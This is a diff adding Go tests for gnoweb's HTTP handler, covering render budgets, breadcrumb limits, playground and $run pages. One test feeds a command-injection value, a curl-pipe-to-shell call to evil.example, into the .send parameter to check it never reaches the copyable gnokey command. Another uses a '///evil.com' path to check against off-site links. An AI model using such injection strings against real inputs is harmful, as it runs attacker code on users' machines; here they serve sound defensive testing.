@@ -57,6 +57,10 @@ func (s *stubClient) Eval(ctx context.Context, pkgPath, expr string) ([]byte, er
 	return nil, gnoweb.ErrClientPackageNotFound
 }
 
+func (s *stubClient) PublicEval(ctx context.Context, pkgPath, expr string) ([]byte, error) {
+	return s.Eval(ctx, pkgPath, expr)
+}
+
 func (s *stubClient) Realm(ctx context.Context, path, args string) ([]byte, error) {
 	if s.realmFunc != nil {
 		return s.realmFunc(ctx, path, args)
@@ -150,6 +154,31 @@ func TestHTTPHandler_Get_InvalidPathNotEchoedToLog(t *testing.T) {
 	assert.Contains(t, logs.String(), fmt.Sprintf("path_length=%d", len(path)))
 }
 
+// Each breadcrumb link carries the segments before it, so a row past the bound
+// folds the rest into its last link rather than growing with the square of
+// the segment count.
+func TestGenerateBreadcrumbPaths_Bounded(t *testing.T) {
+	t.Parallel()
+
+	segs := strings.Repeat("a/", 100) + "z"
+	u, err := weburl.Parse("/r/" + segs + "/:" + segs)
+	require.NoError(t, err)
+
+	data := gnoweb.GenerateBreadcrumbPaths(u, "")
+	require.Len(t, data.Parts, gnoweb.MaxBreadcrumbParts)
+	require.Len(t, data.ArgParts, gnoweb.MaxBreadcrumbParts)
+
+	// The path row shows "r" and 14 segments, then the 86 left and "z".
+	lastPart := data.Parts[len(data.Parts)-1]
+	require.Equal(t, "/r/"+segs, lastPart.URL)
+	require.Equal(t, strings.Repeat("a/", 86)+"z", lastPart.Name)
+
+	// The argument row shows 15 segments, then the 85 left and "z".
+	lastArg := data.ArgParts[len(data.ArgParts)-1]
+	require.Equal(t, u.Path+":"+segs, lastArg.URL)
+	require.Equal(t, strings.Repeat("a/", 85)+"z", lastArg.Name)
+}
+
 // newTestHandlerConfig creates a HTTPHandlerConfig for tests using a stub client.
 func newTestHandlerConfig(t *testing.T, client gnoweb.ClientAdapter) *gnoweb.HTTPHandlerConfig {
 	t.Helper()
@@ -214,7 +243,6 @@ func TestHTTPHandler_Get(t *testing.T) {
 		{Path: "/r/mock/path$download", Status: http.StatusOK, Contains: []string{
 			"// file: render.gno",
 			"one more time",
-			"// file: LicEnse",
 		}},
 		{Path: "/r/invalid/path$download", Status: http.StatusNotFound},
 
@@ -1441,19 +1469,24 @@ func TestHTTPHandler_Post_HiddenPathField(t *testing.T) {
 }
 
 // newRealRendererHelpHandler builds an HTTPHandler with a real HTMLRenderer
-// and a stubClient whose Doc() returns jdoc. Other client methods are not
-// stubbed as the $help endpoint only exercises the Doc() path.
+// and a stubClient whose Doc() returns jdoc and whose package lists no files,
+// enough for $help and the overview's symbols.
 func newRealRendererHelpHandler(t *testing.T, jdoc *doc.JSONDocumentation) *gnoweb.HTTPHandler {
 	t.Helper()
-
-	client := &stubClient{
+	return newRealRendererHandler(t, &stubClient{
 		docFunc: func(ctx context.Context, path string) (*doc.JSONDocumentation, error) {
 			return jdoc, nil
 		},
-	}
+		listFilesFunc: func(context.Context, string) ([]string, error) { return nil, nil },
+	}, io.Discard)
+}
 
+// newRealRendererHandler builds an HTTPHandler over client with a real
+// HTMLRenderer logging into rendererLog.
+func newRealRendererHandler(t *testing.T, client *stubClient, rendererLog io.Writer) *gnoweb.HTTPHandler {
+	t.Helper()
 	renderer := gnoweb.NewHTMLRenderer(
-		slog.New(slog.NewTextHandler(io.Discard, nil)),
+		slog.New(slog.NewTextHandler(rendererLog, nil)),
 		gnoweb.NewDefaultRenderConfig(),
 		client,
 	)
@@ -1469,6 +1502,188 @@ func newRealRendererHelpHandler(t *testing.T, jdoc *doc.JSONDocumentation) *gnow
 	)
 	require.NoError(t, err)
 	return h
+}
+
+// bigDoc is 120 KB of code blocks, which render about 3 MB of HTML.
+var bigDoc = strings.Repeat("```\nx\n```\n\n", 11000)
+
+// docFuncs returns n functions documented by src.
+func docFuncs(n int, src string) []*doc.JSONFunc {
+	funcs := make([]*doc.JSONFunc, n)
+	for i := range funcs {
+		name := fmt.Sprintf("F%d", i)
+		funcs[i] = &doc.JSONFunc{Name: name, Signature: "func " + name + "()", Doc: src, File: "foo.gno", Line: i + 1}
+	}
+	return funcs
+}
+
+// The third doc comment on a page finds the page's budget spent.
+func TestHTTPHandler_DocPagesShareOneRenderBudget(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: docFuncs(3, bigDoc)})
+
+	for _, page := range []string{"$help", "$source"} {
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo"+page, nil))
+		require.Equal(t, http.StatusOK, rec.Code, page)
+		assert.Equal(t, 1, bytes.Count(rec.Body.Bytes(), []byte(`class="gno-render-plaintext"`)), page)
+	}
+}
+
+// On $help the package doc shows above three doc comments that spend the
+// page's budget, so it renders before them.
+func TestGetHelpView_PackageDocRendersFirst(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{PackageDoc: "hello *world*", Funcs: docFuncs(3, bigDoc)})
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), "<em>world</em>")
+}
+
+// A README of 2,000 empty forms renders about 6 MB, so on the overview a doc
+// comment of about 3 MB finds the page's budget spent.
+func TestHTTPHandler_OverviewDocsGetWhatTheReadmeLeft(t *testing.T) {
+	t.Parallel()
+
+	readme := []byte(strings.Repeat("<gno-form exec=\"F\">\n</gno-form>\n\n", 2000))
+	h := newRealRendererHandler(t, &stubClient{
+		docFunc: func(context.Context, string) (*doc.JSONDocumentation, error) {
+			return &doc.JSONDocumentation{Funcs: docFuncs(1, bigDoc)}, nil
+		},
+		listFilesFunc: func(context.Context, string) ([]string, error) { return []string{"README.md"}, nil },
+		fileFunc: func(_ context.Context, _, name string) ([]byte, gnoweb.FileMeta, error) {
+			return readme, gnoweb.FileMeta{}, nil
+		},
+	}, io.Discard)
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$source", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Equal(t, 1, bytes.Count(rec.Body.Bytes(), []byte(`class="gno-render-plaintext"`)))
+}
+
+// 50,000 blank lines highlight past the cap, and the log line names the file
+// with its package path.
+func TestGetSourceView_OverOutputCapLogsPackagePath(t *testing.T) {
+	t.Parallel()
+
+	var logs bytes.Buffer
+	h := newRealRendererHandler(t, &stubClient{
+		listFilesFunc: func(context.Context, string) ([]string, error) { return []string{"a.gno"}, nil },
+		fileFunc: func(context.Context, string, string) ([]byte, gnoweb.FileMeta, error) {
+			return bytes.Repeat([]byte("\n"), 50_000), gnoweb.FileMeta{}, nil
+		},
+	}, &logs)
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$source&file=a.gno", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), "gno-render-plaintext")
+	assert.Contains(t, logs.String(), "path=/r/demo/foo/a.gno ")
+}
+
+// 4,000 empty forms render past the cap, and the README's log line names the
+// file, apart from the realm's own Render output.
+func TestGetSourceView_OverOutputCapLogsReadmePath(t *testing.T) {
+	t.Parallel()
+
+	var logs bytes.Buffer
+	h := newRealRendererHandler(t, &stubClient{
+		listFilesFunc: func(context.Context, string) ([]string, error) { return []string{"README.md"}, nil },
+		fileFunc: func(context.Context, string, string) ([]byte, gnoweb.FileMeta, error) {
+			return []byte(strings.Repeat("<gno-form exec=\"F\">\n</gno-form>\n\n", 4000)), gnoweb.FileMeta{}, nil
+		},
+	}, &logs)
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$source&file=README.md", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), "gno-render-plaintext")
+	assert.Contains(t, logs.String(), "path=/r/demo/foo/README.md ")
+}
+
+// $help lists as many functions as the overview, and ?func= still reaches the
+// ones past them.
+func TestGetHelpView_StopsAtMaxHelpFunctions(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: docFuncs(components.MaxHelpFunctions+1, "")})
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Equal(t, components.MaxHelpFunctions, strings.Count(rec.Body.String(), `<article class="b-action-function"`))
+	assert.Contains(t, rec.Body.String(), "more functions than are shown here")
+
+	last := fmt.Sprintf("F%d", components.MaxHelpFunctions)
+	rec = httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help&func="+last, nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), `id="func-`+last+`"`)
+	assert.NotContains(t, rec.Body.String(), "more functions than are shown here")
+
+	h = newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: docFuncs(components.MaxHelpFunctions, "")})
+	rec = httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	assert.NotContains(t, rec.Body.String(), "more functions than are shown here", "every function is shown")
+}
+
+// A function's card repeats its name for each parameter, so a 1,100-byte name
+// and 1,000 parameters write about 3 MB: the page's budget holds two cards, and
+// the list stops at the third, before a small fourth.
+func TestGetHelpView_ChargesFunctionCards(t *testing.T) {
+	t.Parallel()
+
+	funcs := make([]*doc.JSONFunc, 3)
+	for i := range funcs {
+		name := fmt.Sprintf("F%d", i) + strings.Repeat("x", 1100)
+		funcs[i] = &doc.JSONFunc{Name: name, Signature: "func " + name + "()"}
+		for j := range 1000 {
+			funcs[i].Params = append(funcs[i].Params, &doc.JSONField{Name: fmt.Sprintf("p%d", j), Type: "int"})
+		}
+	}
+	funcs = append(funcs, &doc.JSONFunc{Name: "G", Signature: "func G()"})
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: funcs})
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Equal(t, 2, strings.Count(rec.Body.String(), `<article class="b-action-function"`))
+	assert.Contains(t, rec.Body.String(), "more functions than are shown here")
+}
+
+// A function's line in the table of contents names each parameter, so cards of
+// 20 parameters of 200-byte names fill the page's 8 MiB with about 1 MB of
+// table of contents beside them, unless that line is charged with its card;
+// charged twice over, the list stops short of filling the page.
+func TestGetHelpView_ChargesTocItems(t *testing.T) {
+	t.Parallel()
+
+	get := func(funcs []*doc.JSONFunc) string {
+		h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: funcs})
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+		require.Equal(t, http.StatusOK, rec.Code)
+		return rec.Body.String()
+	}
+	funcs := make([]*doc.JSONFunc, components.MaxHelpFunctions)
+	for i := range funcs {
+		name := fmt.Sprintf("F%d", i)
+		funcs[i] = &doc.JSONFunc{Name: name, Signature: "func " + name + "()"}
+		for j := range 20 {
+			funcs[i].Params = append(funcs[i].Params, &doc.JSONField{Name: fmt.Sprintf("p%d", j) + strings.Repeat("x", 200), Type: "int"})
+		}
+	}
+
+	layout := len(get(nil))
+	page := get(funcs)
+	assert.Contains(t, page, "more functions than are shown here")
+	assert.LessOrEqual(t, len(page), layout+8<<20)
+	assert.Greater(t, len(page), layout+8<<20-64<<10)
 }
 
 func TestGetHelpView_RendersPackageDocAsHTML(t *testing.T) {
@@ -1487,6 +1702,38 @@ func TestGetHelpView_RendersPackageDocAsHTML(t *testing.T) {
 	body := rec.Body.String()
 	require.Contains(t, body, "<strong>foo</strong>", "bold markdown must render as <strong>")
 	require.NotContains(t, body, "**foo**", "literal markdown syntax must not leak")
+}
+
+// The .send value lands in the gnokey command the page offers to copy, so a
+// link carrying anything but coins must not reach it.
+func TestGetHelpView_SendMustBeCoins(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: []*doc.JSONFunc{{Name: "Hello"}}})
+
+	get := func(send string) string {
+		req := httptest.NewRequest(http.MethodGet, "/r/demo/foo$help&func=Hello&.send="+url.QueryEscape(send), nil)
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, req)
+		require.Equal(t, http.StatusOK, rec.Code)
+		return rec.Body.String()
+	}
+
+	body := get("1ugnot")
+	assert.Contains(t, body, `data-action-function-send-value="1ugnot"`)
+
+	body = get(`1ugnot" $(curl -s evil.example | sh) "`)
+	assert.NotContains(t, body, "data-action-function-send-value")
+	assert.NotContains(t, body, "evil.example")
+
+	// ParseCoins accepts a newline between amount and denom; the copy button
+	// drops lines starting with "/", so a raw value would cut the command.
+	body = get("1\n/gno.land/r/demo/foo:abc")
+	assert.Contains(t, body, `data-action-function-send-value="1/gno.land/r/demo/foo:abc"`)
+
+	// Whitespace alone parses as no coins, so no coin warning.
+	body = get(" ")
+	assert.NotContains(t, body, "data-action-function-send-value")
 }
 
 func TestGetHelpView_RendersFunctionDocAsHTML(t *testing.T) {
@@ -1756,6 +2003,172 @@ func TestHTTPHandler_ThemeCookie(t *testing.T) {
 					"expected HTML to not contain data-theme attribute")
 			}
 		})
+	}
+}
+
+// TestHTTPHandler_PlaygroundPage tests the /_/play standalone playground route.
+func TestHTTPHandler_PlaygroundPage(t *testing.T) {
+	t.Parallel()
+
+	config := newTestHandlerConfig(t, &stubClient{})
+	logger := slog.New(slog.NewTextHandler(&testingLogger{t}, &slog.HandlerOptions{}))
+	handler, err := gnoweb.NewHTTPHandler(logger, config)
+	require.NoError(t, err)
+
+	// The default code says "Hello, Playground!"; shared code says
+	// sentinel_42, so a fallback to the default never passes for it.
+	const hello = "Hello, Playground!"
+	cases := []struct {
+		name    string
+		path    string
+		contain string
+		refused bool
+	}{
+		{"default playground", "/_/play", hello, false},
+		{"plain code", "/_/play?code=package+sentinel_42", "package sentinel_42", false},
+		// Written by playground-files.ts's shareLink: a.gno holds a line
+		// shaped like the old text format's separator, and stays whole.
+		{"shared code", "/_/play?code=i65WykvMTVWyUkrUS8%2FLV9JRSs7PK0nNKwGKxOQVJCZnJ6anKhQDBTLzUnPiTYxi8mLy9PUVdHV1FZJAOkCsmLy00rxkBUcNTYXqWpACpVoduLlJGOZiNVWpNhYA&z", "\npackage sentinel_42\n\n// --- b.gno ---\nfunc A() {}\n\n</pre>", false},
+		{"shared code that does not inflate", "/_/play?code=cGFja2FnZSBtYWluCg%3D%3D&z", hello, true},
+		// No code to open, so nothing to say.
+		{"z and no code", "/_/play?z", hello, false},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			req := httptest.NewRequest(http.MethodGet, tc.path, nil)
+			rr := httptest.NewRecorder()
+			handler.ServeHTTP(rr, req)
+			assert.Equal(t, http.StatusOK, rr.Code)
+			body := rr.Body.String()
+			assert.Contains(t, body, tc.contain)
+			if tc.contain != hello {
+				assert.NotContains(t, body, hello)
+			}
+			assert.Equal(t, tc.refused, strings.Contains(body, "This link's code was not opened"))
+		})
+	}
+
+	// The breadcrumb keeps the shared code's query, then ends with the pill.
+	// The z flag is no field, but is submitted with the code, so pressing
+	// Enter in it does not reopen the compressed bytes as text.
+	rr := httptest.NewRecorder()
+	handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/_/play?code=abc&z", nil))
+	body := rr.Body.String()
+	assert.NotContains(t, body, `id="z"`)
+	assert.Contains(t, body, `<input type="hidden" name="z" value="" />`)
+	query := strings.Index(body, `name="code" value="abc"`)
+	require.NotEqual(t, -1, query)
+	assert.Greater(t, strings.Index(body, `class="b-tag">playground<`), query)
+
+	// Plain code has no flag to carry.
+	rr = httptest.NewRecorder()
+	handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/_/play?code=abc", nil))
+	assert.NotContains(t, rr.Body.String(), `name="z"`)
+}
+
+// TestHTTPHandler_PlaygroundCopy tests opening a package copy with /_/play?from=,
+// with or without the chain domain in front of the path.
+func TestHTTPHandler_PlaygroundCopy(t *testing.T) {
+	t.Parallel()
+
+	mockPackage := &gnoweb.MockPackage{
+		Domain: "gno.land",
+		Path:   "/p/demo/foo",
+		Files: map[string]string{
+			"foo.gno": `package foo`,
+			"bar.gno": `package foo`,
+		},
+	}
+
+	config := newTestHandlerConfig(t, gnoweb.NewMockClient(mockPackage))
+	config.Meta.Domain = "gno.land"
+	logger := slog.New(slog.NewTextHandler(&testingLogger{t}, &slog.HandlerOptions{}))
+	handler, err := gnoweb.NewHTTPHandler(logger, config)
+	require.NoError(t, err)
+
+	for _, from := range []string{"p/demo/foo", "gno.land/p/demo/foo"} {
+		req := httptest.NewRequest(http.MethodGet, "/_/play?from="+from, nil)
+		rr := httptest.NewRecorder()
+		handler.ServeHTTP(rr, req)
+
+		assert.Equal(t, http.StatusOK, rr.Code, from)
+		body := rr.Body.String()
+		assert.Contains(t, body, "foo.gno", from)
+		assert.Contains(t, body, "package foo", from)
+		// The breadcrumb names the copied package, linked to it, then the pill.
+		assert.Contains(t, body, `href="/p/demo/foo"`, from)
+		assert.Contains(t, body, `class="view"`, from)
+		// The page, and the card a shared link shows, name the copy.
+		assert.Contains(t, body, "<title>p/demo/foo · Playground - gno.land</title>", from)
+		assert.Contains(t, body, `content="p/demo/foo · Playground - gno.land"`, from)
+		// The header keeps the package's tabs, none of them current.
+		assert.Contains(t, body, `href="/p/demo/foo$source"`, from)
+		assert.NotContains(t, body, "link--is-active", from)
+	}
+
+	// Only a bare package path is copied, and gets its tabs: a file, args
+	// or a query is no package, and a missing package is not found.
+	for from, status := range map[string]int{
+		"p/demo/foo/foo.gno":       http.StatusBadRequest,
+		"p/demo/foo$file=evil.gno": http.StatusBadRequest,
+		"p/demo/foo:args":          http.StatusBadRequest,
+		"p/demo/foo?x=1":           http.StatusBadRequest,
+		"p/demo/nope":              http.StatusNotFound,
+	} {
+		rr := httptest.NewRecorder()
+		handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/_/play?from="+url.QueryEscape(from), nil))
+		assert.Equal(t, status, rr.Code, from)
+		assert.NotContains(t, rr.Body.String(), `$source"`, from)
+	}
+
+	// Extra leading slashes never turn into links to another host.
+	rr := httptest.NewRecorder()
+	handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/_/play?from=///evil.com/x", nil))
+	assert.NotContains(t, rr.Body.String(), `href="//`)
+
+	// A node that does not answer in time gives the copy the 408 pages get.
+	for name, nodeErr := range map[string]error{
+		"client timeout":    gnoweb.ErrClientTimeout,
+		"deadline exceeded": context.DeadlineExceeded,
+	} {
+		slow, err := gnoweb.NewHTTPHandler(logger, newTestHandlerConfig(t, &stubClient{
+			listFilesFunc: func(context.Context, string) ([]string, error) { return nil, nodeErr },
+		}))
+		require.NoError(t, err)
+		rr := httptest.NewRecorder()
+		slow.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/_/play?from=p/demo/foo", nil))
+		assert.Equal(t, http.StatusRequestTimeout, rr.Code, name)
+	}
+}
+
+// TestHTTPHandler_PlayRedirect checks that $play sends a package or file to
+// its playground copy, and that $fork, a name no release served, does not.
+func TestHTTPHandler_PlayRedirect(t *testing.T) {
+	t.Parallel()
+
+	handler, err := gnoweb.NewHTTPHandler(slog.New(slog.NewTextHandler(&testingLogger{t}, &slog.HandlerOptions{})),
+		newTestHandlerConfig(t, &stubClient{}))
+	require.NoError(t, err)
+
+	cases := map[string]string{
+		"/r/demo/foo$play":         "/_/play?from=r%2Fdemo%2Ffoo",
+		"/r/demo/foo/bar.gno$play": "/_/play?file=bar.gno&from=r%2Fdemo%2Ffoo",
+	}
+	for path, want := range cases {
+		rr := httptest.NewRecorder()
+		handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, path, nil))
+		assert.Equal(t, http.StatusFound, rr.Code, path)
+		assert.Equal(t, want, rr.Header().Get("Location"), path)
+	}
+
+	// $fork is gone, and a listing has no copy to open.
+	for _, path := range []string{"/r/demo/foo$fork", "/r/demo/$play", "/p/$play"} {
+		rr := httptest.NewRecorder()
+		handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, path, nil))
+		assert.NotEqual(t, http.StatusFound, rr.Code, path)
+		assert.Empty(t, rr.Header().Get("Location"), path)
 	}
 }
 
@@ -4168,6 +4581,7 @@ func TestHTTPHandler_AskAI(t *testing.T) {
 
 		_, body := get("/r/mock/path$help", "gno.land")
 		assert.Contains(t, body, `class="b-ai-func"`)
+		assert.Contains(t, body, `data-copy-kind="ai_prompt" data-copy-text-value="Explain the function Transfer of the gno.land realm `)
 	})
 
 	// An error page gets no menu: its prompts would point at views that
@@ -4261,6 +4675,11 @@ func TestHTTPHandler_RealmNotice(t *testing.T) {
 		{"/r/nym-sunny000/app$state", true},
 		{"/p/nym-sunny000/lib", true},
 		{"/r/unknown/pkg", true},
+		// A copy carries the notice of the package it copies.
+		{"/_/play?from=r/nym-sunny000/app", true},
+		{"/_/play?from=p/nym-sunny000/lib", true},
+		{"/_/play?from=r/gnoland/home", false},
+		{"/_/play", false},
 		{"/chain", false},
 	}
 
@@ -4336,4 +4755,104 @@ func TestHTTPHandler_RealmNotice(t *testing.T) {
 		assert.Contains(t, body, "This transaction link is requesting")
 		assert.NotContains(t, body, line)
 	})
+}
+
+// TestHTTPHandler_RunPage checks that $run serves the run page only for a
+// realm or package that exists, with a starter script that calls it. Any
+// other path renders as if $run were not there, and an error page offers no
+// Run tab.
+func TestHTTPHandler_RunPage(t *testing.T) {
+	t.Parallel()
+
+	render := &doc.JSONFunc{
+		Name:    "Render",
+		Params:  []*doc.JSONField{{Name: "path", Type: "string"}},
+		Results: []*doc.JSONField{{Type: "string"}},
+	}
+	client := gnoweb.NewMockClient(
+		&gnoweb.MockPackage{Path: "/r/demo/foo", Domain: "gno.land", Files: map[string]string{"foo.gno": "package foo"}, Functions: []*doc.JSONFunc{render}},
+		&gnoweb.MockPackage{Path: "/p/demo/bar", Domain: "gno.land", Files: map[string]string{"bar.gno": "package bar"}, Functions: []*doc.JSONFunc{{Name: "New"}}},
+	)
+	handler, err := gnoweb.NewHTTPHandler(slog.New(slog.NewTextHandler(&testingLogger{t}, &slog.HandlerOptions{})),
+		newTestHandlerConfig(t, client))
+	require.NoError(t, err)
+
+	get := func(path string) (int, string) {
+		rr := httptest.NewRecorder()
+		handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, path, nil))
+		return rr.Code, rr.Body.String()
+	}
+	const runPage = `data-controller="run"`
+
+	served := map[string]string{
+		"/r/demo/foo$run":         "_ = foo.Render",
+		"/r/demo/foo/foo.gno$run": "_ = foo.Render",
+		"/p/demo/bar$run":         "_ = bar.New",
+	}
+	for path, call := range served {
+		code, body := get(path)
+		assert.Equal(t, http.StatusOK, code, path)
+		assert.Contains(t, body, runPage, path)
+		assert.Contains(t, body, call, path)
+	}
+
+	// Without the package or the file, or on a $source page, $run changes
+	// nothing: the same page, header tabs included, and a missing realm's
+	// 404 page does not link to its $run.
+	for _, path := range []string{"/u/alice", "/r/demo/", "/r/nope/missing", "/p/nope/missing", "/r/demo/foo/nope.gno", "/r/demo/foo$source"} {
+		wantCode, wantBody := get(path)
+		run := path + "$run"
+		if strings.Contains(path, "$") {
+			run = path + "&run"
+		}
+		code, body := get(run)
+		assert.Equal(t, wantCode, code, path)
+		assert.Equal(t, wantBody, body, path)
+		assert.NotContains(t, body, runPage, path)
+		if code != http.StatusOK {
+			assert.NotContains(t, body, `$run"`, path)
+		}
+	}
+	code, body := get("/r/nope/missing")
+	assert.Equal(t, http.StatusNotFound, code)
+	assert.NotContains(t, body, `$run"`, "a 404 page has no Run tab")
+}
+
+// TestHTTPHandler_RunPageNotAPackageURL checks that $run is never served on
+// a user page or a listing URL, even when the node answers qdoc for its path
+// (the RPC client trims the trailing slash of /r/demo/foo/).
+func TestHTTPHandler_RunPageNotAPackageURL(t *testing.T) {
+	t.Parallel()
+
+	client := &stubClient{docFunc: func(context.Context, string) (*doc.JSONDocumentation, error) {
+		return &doc.JSONDocumentation{}, nil
+	}}
+	handler, err := gnoweb.NewHTTPHandler(slog.New(slog.NewTextHandler(&testingLogger{t}, &slog.HandlerOptions{})),
+		newTestHandlerConfig(t, client))
+	require.NoError(t, err)
+
+	for _, path := range []string{"/u/alice$run", "/r/demo/foo/$run"} {
+		rr := httptest.NewRecorder()
+		handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, path, nil))
+		assert.NotContains(t, rr.Body.String(), `data-controller="run"`, path)
+	}
+}
+
+// TestHTTPHandler_RunPageNodeError checks that $run answers a node failure
+// with its error page, not with a run page for a package it could not read.
+func TestHTTPHandler_RunPageNodeError(t *testing.T) {
+	t.Parallel()
+
+	client := &stubClient{docFunc: func(context.Context, string) (*doc.JSONDocumentation, error) {
+		return nil, gnoweb.ErrClientTimeout
+	}}
+	handler, err := gnoweb.NewHTTPHandler(slog.New(slog.NewTextHandler(&testingLogger{t}, &slog.HandlerOptions{})),
+		newTestHandlerConfig(t, client))
+	require.NoError(t, err)
+
+	rr := httptest.NewRecorder()
+	handler.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/r/demo/foo$run", nil))
+	assert.Equal(t, http.StatusRequestTimeout, rr.Code)
+	assert.NotContains(t, rr.Body.String(), `data-controller="run"`)
+	assert.NotContains(t, rr.Body.String(), `$run"`)
 }
